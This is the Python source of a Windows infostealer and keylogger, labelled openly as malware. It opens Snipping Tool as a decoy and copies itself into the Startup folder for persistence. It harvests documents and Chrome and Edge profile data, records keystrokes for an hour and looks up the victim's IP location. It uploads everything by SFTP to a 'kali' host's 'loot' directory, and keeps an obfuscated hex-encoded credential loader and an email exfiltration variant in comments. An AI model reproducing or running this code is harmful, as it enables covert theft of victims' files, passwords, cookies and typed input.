### process lock ###
import os
import sys
##import atexit

os.startfile(r'C:\Windows\System32\SnippingTool.exe')

user = os.path.expanduser('~')
lockfilepath = os.path.join(user, "lockfile.lock")

if os.path.exists(lockfilepath):
    sys.exit(1)
with open(lockfilepath, "w"):
    pass

##def remove_lock(signal_number=None, frame=None):
##    try:
##        os.remove(lockfilepath)
##        print("Lock file removed.")
##    except FileNotFoundError:
##        print("Lock file already removed.")
##
##atexit.register(remove_lock)

### persistence ###
import shutil

def startup():
    startfolder = rf"{os.getenv("APPDATA")}\Microsoft\Windows\Start Menu\Programs\StartUp\\"
    try:
        shutil.copy(sys.argv[0], startfolder)
    except shutil.SameFileError:
        pass

### imports ###
import time
import threading
import py7zr
import requests
import paramiko
from datetime import datetime
from pynput import keyboard

### exfiltration ###
def sftp_func(filepath):

##    l = """62203d2062797465732e66726f6d68657828225c75303033355c75303033305c75303033365c7\
##5303033355c75303033365c75303033375c75303033365c75303033315c75303033375c75303033345c7\
##5303033375c75303033375c75303033365c75303033395c75303033365c75303036355c75303033335c7\
##5303033365c75303033335c75303033385c75303033335c753030333222292e6465636f646528290a612\
##03d2062797465732e66726f6d68657828225c75303033365c75303036325c75303033365c75303033315\
##c75303033365c75303036335c75303033365c753030333922292e6465636f646528290a63203d2062797\
##465732e66726f6d68657828225c75303033335c75303033315c75303033335c75303033395c753030333\
##35c75303033325c75303033325c75303036355c75303033335c75303033315c75303033335c753030333\
##65c75303033335c75303033385c75303033325c75303036355c75303033335c75303033365c753030333\
##35c75303033395c75303033325c75303036355c75303033335c753030333522292e6465636f64652829"""

# pass, user, ip > to hex > escape unicode chars > hex block
##    b = "Pegatwin682"
    a = "kali"
    c = "192.168.69.5"
    
    success = False
    while success == False:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            pub_key = os.path.join(os.path.dirname(sys.argv[0]), "id_ed25519.pub")
##            exec(bytes.fromhex(l), globals())
            client.connect(c, a, key_filename=pub_key, timeout=4)
            sftp = client.open_sftp()

            destination_path = f'/home/{a}/loot/{os.path.basename(filepath)}'
            sftp.put(filepath, destination_path)
            success = True
            
        except paramiko.ssh_exception.NoValidConnectionsError:
            pass
        except OSError:
            pass
        
    sftp.close()
    client.close()
    os.remove(filepath)


    ''' with email '''
    # def smtp_func(filepath):

    #     inbox_name = 'emailname@proton.me'
    #     inbox_pword = 'password'

    #     msg = EmailMessage()
    #     msg['Subject'] = f"{os.path.basename(filepath)}"
    #     msg['From'] = inbox_name
    #     msg['To'] = inbox_name

    #     # attachment not text
    #     msg.set_content(attachment)

    #     try:
    #         with smtplib.SMTP("smtp.proton.me", 587) as s:
    #             s.starttls()
    #             s.login(inbox_name, inbox_pword)
    #             s.send_message(msg)
    #     except:
    #         print("failed")

### get files ###
def collect_files():
    paths_list = [os.path.join(user, "Documents"),
                  os.path.join(user, "Desktop"),
                  os.path.join(user, "Downloads")]

    zipPath = os.path.join(user, "dogs.7z")

    for x in paths_list:
        if not os.path.exists(x):
             paths_list.remove(x)

    filelist = []

    while len(paths_list) > 0:
        cur_path = paths_list.pop()
        if "My Videos" in cur_path or "My Music" in cur_path or "My Pictures" in cur_path:
            continue
        elif os.path.isdir(cur_path):
            for child in os.listdir(cur_path):
                    paths_list.append(os.path.join(cur_path, child))
        elif cur_path.lower().endswith(('.txt', '.xlsx', '.pdf', '.docx')):
            filelist.append(cur_path)

    for browser in ['Google', 'Edge']:
        default = rf"{os.getenv("LOCALAPPDATA")}\Microsoft\{browser}\User Data\Default"
        if os.path.exists(default):
            for x in os.listdir(default):
                if not os.path.isdir(os.path.join(default, x)):
                    filelist.append(os.path.join(default, x))

    with py7zr.SevenZipFile(zipPath, "w") as archive:
        for a in filelist:
            archive.write(a)
            
    sftp_func(zipPath)

### geolocation/IP info ###
def iplocate():
    try:
        url = 'https://ipinfo.io/json'
        response = requests.get(url, verify = True)

        if response.status_code != 200:
            return None
        
        data = response.json()
        data.pop("readme")

    except requests.exceptions.ConnectionError:
        data = {"Request Status": "Failed"}

    ipinfopath = os.path.join(user, "ipinfo.txt")

    with open(ipinfopath, "w") as ipinfo:
        for x in data.keys():
            ipinfo.write(f"{x}: {data[x]}\n")

    sftp_func(ipinfopath)

### capture keys ###
def capture_keys():
    startTime = datetime.now().strftime("%d/%m/%Y %I:%M")
    text = ""

    def on_press(key):
        nonlocal text
        try:
            text += ('{0}'.format(key.char))
        except AttributeError:
            if key == keyboard.Key.backspace:
                text = text[0:-1]
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.enter:
                text += "\n"
##            elif key == keyboard.Key.esc:
##                return False

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(3600)
    listener.stop()

    endTime = datetime.now().strftime("%I:%M %p")
    timestamp = f'>> {startTime}-{endTime} <<\n'

    keyfilepath = os.path.join(user, "keylog.txt")
    with open(keyfilepath, "w") as keyfile:
        keyfile.write(timestamp)
        keyfile.write(text)
        keyfile.write('\n')

    sftp_func(keyfilepath)




if __name__ == "__main__":
    
    try:
        startup()
        t1 = threading.Thread(target=collect_files)
        t2 = threading.Thread(target=capture_keys)
        t3 = threading.Thread(target=iplocate)

        threads = [t1, t2, t3]
        for thread in threads:
##            thread.daemon = True
            thread.start()
        
        for thread in threads:
            thread.join()

    finally:
        os.remove(lockfilepath)
